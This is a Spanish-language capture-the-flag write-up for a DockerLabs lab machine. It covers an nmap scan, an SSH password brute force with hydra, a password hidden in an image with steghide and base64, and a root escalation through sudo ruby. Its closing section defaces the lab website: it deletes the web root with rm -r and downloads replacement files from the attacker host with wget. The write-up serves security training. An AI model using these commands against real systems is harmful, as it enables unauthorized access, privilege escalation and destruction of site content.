
![[20250808115256.png]]

# Fase de reconocimiento

Primero realizamos un escaneo basico con nmap

```bash
nmap -p- --open -min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts
```

Una vez tenemos los puertos abiertos vamos a realizar un segundo escaneo con scripts basicos de nmap para ver el servicio y la version que corren por detras 

```bash
nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

![[20250808115450.png]]

Una vez sabemos esto vamos a empezar la investigación por el puerto 80 la pagina web http 

![[20250808115526.png]]

a priori parece que es una especie de portal de comunicación entre los empleados de la empresa.

Leyendo los mensajes podemos ver lo siguiente

![[20250808115625.png]]

Vemos que hay un usuario llamado Carlota, posteriormente vemos que se han detectado contraseñas vulnerables por lo que vamos a tratar de hacer un ataque de diccionario con hydra

# Fase de explotación

```bash
hydra -t 64 -l carlota -P /usr/share/wordlists/rockyou.txt -s 22 172.17.0.2 ssh
```

Descubrimos que las credenciales son carlota:babygirl

asi que nos conectamos por ssh a carlota con la contraseña babygirl.

```bash
ssh carlota@172.17.0.2
```

![[20250808120136.png]]

una vez estamos dentro como el sistema por defecto usa una sh vamos a cambiarla por una bash y vamos a exportar el TERM a xterm

```bash
/bin/bash
```

```bash
export TERM=xterm
```

ahora si de manera mas cómoda vamos a buscar la escalada de privilegios.

# Fase de post explotación

como el usuario carlota probamos como siempre los siguientes comandos:

```bash
sudo -l
```

![[20250808120338.png]]

no sacamos nada.

```bash
find / -perm -4000 2>/dev/null
```

![[20250808120417.png]]

no vemos nada interesante.

tras buscar un poco con comandos no vemos nada relevante asi que vamos a explorar las rutas del sistema.

en el directorio `/home/carlota/Desktop/fotos/vacaciones` vemos que hay una imagen.jpg igual en los metadatos de la imagen vemos algo. para conseguir la imagen yo seguí este proceso.

1- Desde la maquina victima en el directorio mencionado 

```bash
python3 -m http.server 8081
```

2-desde la pagina web vamos a la Url `http://172.17.0.2:8081/imagen.jpg` y descargamos la imagen

![[20250808120720.png]]

una vez la tenemos en nuestra maquina atacante vamos a buscar metadatos

3- usamos steghide para ver que hay en la imagen por detras

```bash
steghide info imagen.jpg
```

![[20250808120914.png]]

Nos solicitan un passphrase pulsamos enter sin poner nada ya que no solicita credenciales reales 


vemos que contiene un archivo llamado `secret.txt` asi que vamos a extraerlo

4-usamos steghide para extraer el archivo 

```bash
steghide extract -sf imagen.jpg
```
![[20250808121101.png]]

a mi me pone que ya existe por que lo hice antes pero se debería descargar en vuestro equipo el archivo `seecret.txt`

hacemos un cat para ver que contiene y descubrimos esto 

![[20250808121150.png]]

contiene un codigo en base64 que vamos a desencriptar para descubrir lo que oculta

```bash
echo 'ZXNsYWNhc2FkZXBpbnlwb24=' |base64 -d
```

![[20250808121232.png]]

tenemos una aparente contraseña `eslacasadepinypon` pero aun no sabemos donde usarla asi que vamos a seguir explorando con carlota el sistema

![[20250808121336.png]]

vemos que hay un usuario llamado oscar asi que vamos a probar si la contraseña le pertenece a el 

```bash
su oscar
```

contraseña `eslacasadepinypon`

![[20250808121426.png]]

vemos que si, vamos a exportar la shell a una bash

```bash
/bin/bash
```

# Escalada de privilegios

ahora utilizamos el comando 

```bash
sudo -l
```

con la intención de ver si tenemos permisos de sudo en algún binario

![[20250808121517.png]]

vemos que tenemos permisos sudoers en el binario ruby asi que buscamos en GTFObins que podemos hacer

![[20250808121605.png]]

aqui vemos que con un sencillo codigo podemos escalar a root asi que vamos a probarlo 

```bash
sudo ruby -e 'exec "/bin/bash"'
```

![[20250808121723.png]]

y conseguimos acceso como root

# Extra

Como siempre en las maquina DockerLabs vamos a poner nuestra firma esto lo enseñamos a hacer en la maquina chocolate 

vamos a modificar la pagina html para dejar una huella diciendo que hemos estado aqui y hemos vulnerado la maquina 

en nuestra maquina atacante donde tengamos nuestro html personalizado abrimos un puerto web con python

```bash
python3 -m http.server 8081
```

en la maquina victima ya como root vamos al directorio `/var/www/html`

```bash
cd /var/www/html
```

y una vez ahi realizamos el siguiente comando para borrar la informacion 

```bash
rm -r ./*
```

una vez hecho esto vamos a descargarnos nuestro archivo html y la imagen que necesitamos

```bash
wget http://192.168.1.182:8081/index.html -O index.html && wget http://192.168.1.182:8081/panda.png -O panda.png
```

ahora vamos a la pagina web al index.html recargamos la pagina y vemos nuestra firma

![[20250808122216.png]]